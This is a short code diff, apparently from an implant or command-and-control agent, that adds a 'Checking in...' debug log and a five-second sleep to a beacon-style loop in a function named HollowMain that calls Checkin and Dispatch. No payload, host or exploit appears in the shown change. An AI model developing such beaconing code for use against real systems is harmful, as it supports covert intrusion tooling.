@@ -34,6 +34,7 @@ void HollowMain() {
 	}
 
 	while (TRUE) {
+		DEBUG_LOGA("[+] Checking in...");
 		if (!Checkin()) {
 			DEBUG_LOGA("[!] Failed Checkin");
 			break;
@@ -43,6 +44,8 @@ void HollowMain() {
 			DEBUG_LOGA("[!] Failed Dispatch");
 			break;
 		}
+
+		Sleep(5000);
 
 	}
 
